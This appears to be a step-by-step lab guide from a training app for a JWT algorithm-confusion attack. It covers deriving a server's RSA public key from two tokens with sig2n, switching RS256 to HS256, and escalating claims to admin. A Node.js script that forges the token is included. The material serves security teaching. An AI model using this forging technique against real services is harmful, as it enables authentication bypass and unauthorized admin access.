Attack Instructions — Algorithm Confusion with Key Derivation

The server uses RSA (RS256) for signing but does NOT expose the public key. However, the RSA public key can be derived mathematically from two valid JWT signatures. Once derived, the same algorithm confusion attack from Lab 7 applies.

1 Login and obtain two valid JWT tokens
Login with chirayu / chirayu123. Save the first token, logout, login again to get a second token. Or use the "Collect Two Tokens" button above.
2 Derive the server's public key using sig2n
Use the PortSwigger rsa_sign2n Docker container or similar tool: 
# Using PortSwigger's Docker container:
docker run --rm -it portswigger/sig2n <token1> <token2>

# The tool will output:
# - Candidate RSA public keys (X.509 / PEM format)
# - Tampered JWTs signed with each candidate key
# - You need to test which key is correct
3 Identify the correct public key
The tool generates multiple candidate keys. Test each one:
1. Take each candidate public key (X.509 PEM format)
2. Sign a test JWT with HS256 using that key as the HMAC secret
3. Send it to the server — the correct key will produce a valid response

The sig2n tool may also output tampered JWTs — try sending those directly.
4 Intercept the request in Burp Suite
Open Burp Suite and configure your browser to use Burp's proxy (127.0.0.1:8080). Navigate to the Vulnerable Admin page and intercept the request.
5 Modify the JWT header — change algorithm
Change the algorithm from RS256 to HS256: 
{
  "alg": "HS256",
  "typ": "JWT"
}
6 Modify the JWT payload — escalate privileges
Change the subject to admin: 
{
  "sub": "admin",
  "role": "admin"
}
7 Sign the token using the derived public key as HMAC secret
Use the correct derived public key (PEM format) as the HMAC secret: 
// Node.js exploit script:
const crypto = require('crypto');
const fs = require('fs');

// Use the derived public key (from sig2n output)
const derivedKey = fs.readFileSync('derived_public.pem', 'utf8');

// Build header and payload
const header = Buffer.from(JSON.stringify({
  alg: 'HS256', typ: 'JWT'
})).toString('base64url');

const payload = Buffer.from(JSON.stringify({
  sub: 'admin', role: 'admin'
})).toString('base64url');

// Sign with HMAC-SHA256 using the derived public key as secret
const hmac = crypto.createHmac('sha256', derivedKey);
hmac.update(`${header}.${payload}`);
const signature = hmac.digest('base64url');

console.log(`${header}.${payload}.${signature}`);
8 Send the modified request
Replace the cookie value with the forged JWT token and forward the request. The server will accept it because it uses the public key to verify HS256 tokens.
